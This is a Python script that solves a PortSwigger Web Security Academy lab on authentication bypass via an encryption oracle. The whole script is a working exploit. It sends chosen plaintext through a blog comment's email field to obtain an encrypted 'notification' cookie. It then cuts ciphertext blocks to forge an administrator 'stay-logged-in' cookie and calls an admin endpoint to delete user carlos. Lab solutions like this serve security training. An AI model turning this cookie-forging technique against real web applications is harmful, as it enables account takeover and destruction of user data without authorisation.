#!/usr/bin/env python3
# Authentication bypass via encryption oracle
# Lab-Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import base64
import requests
import sys
import time
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def check_expired_lab(client, host):
    return client.get(host).status_code == 504


def find_valid_post_id(client, host):
    r = client.get(host)
    soup = BeautifulSoup(r.text, 'html.parser')

    # <div class="blog-post">
    #   <a href="/post?postId=8"><img src="/image/blog/posts/23.jpg"/></a>
    #      <h2>The Peopleless Circus</h2>
    #      <p>...</p>
    #  <a class="button is-small" href="/post?postId=8">View post</a>
    # </div>

    postId = None
    try:
        postId = soup.find('div', attrs={'class': 'blog-post'}).find_next('a').get('href').split('=')[1]
    except TypeError:
        pass
    except AttributeError:
        pass
    return postId


def encrypt(client, host, postId, plaintext):
    def get_csrf_token(client, url):
        r = client.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        return soup.find('input', attrs={'name': 'csrf'})['value']

    url = f'{host}/post'
    data = {
        'csrf': get_csrf_token(client, f'{url}?postId={postId}'),
        'postId': postId,
        'comment': 'mycomment',
        'name': 'myname',
        'email': plaintext,
        'website': ''
    }

    try:
        client.post(f'{url}/comment', data=data, allow_redirects=False)
        cookie_value = client.cookies.get('notification')
    except TypeError:
        return None
    return cookie_value


def remove_blocks(s, num_of_blocks):
    b = base64.b64decode(urllib.parse.unquote(s))
    return urllib.parse.quote(base64.b64encode(b[(16*num_of_blocks):]))


def deleteUser(client, host, username):
    url = f'{host}/admin/delete?username={username}'
    return client.get(url, allow_redirects=False).status_code == 302


def main():
    print('[+] Authentication bypass via encryption oracle')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        if check_expired_lab(client, host):
            print(f'[-] Lab is expired, please provide new link')
            sys.exit(-2)

        valid_postId = find_valid_post_id(client, host)
        if not valid_postId:
            print(f'[-] Failed to find valid post ID')
            sys.exit(-3)
        print(f'[+] Found valid post ID: {valid_postId}')

        string = f'administrator:{time.time()}'
        padding = 9
        print(f'[ ] Attempt to encrypted string {string} with padding of {padding} bytes')
        encrypted_string = encrypt(client, host, valid_postId, f'{padding*"x"}{string}')
        if not encrypted_string:
            print(f'[-] Failed to obtain encrypted string')
            sys.exit(-4)
        print(f'[+] Obtained encrypted string: {encrypted_string}')

        blocks_to_remove = 2
        stay_logged_in_cookie = remove_blocks(encrypted_string, blocks_to_remove)
        if not stay_logged_in_cookie:
            print(f'[-] Failed to remove first {blocks_to_remove} blocks')
            sys.exit(-5)
        print(f'[+] Removed first {blocks_to_remove} blocks: {stay_logged_in_cookie}')

        client.cookies.clear()
        client.cookies.set('stay-logged-in', stay_logged_in_cookie, domain=f'{host[8:]}')        
        print(f'[+] Removed pre-existing cookies and set stay-logged-in cookie')

        if not deleteUser(client, host, 'carlos'):
            print(f'[-] Failed to delete user carlos')
            sys.exit(-6)
        print(f'[+] Deleted user carlos')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
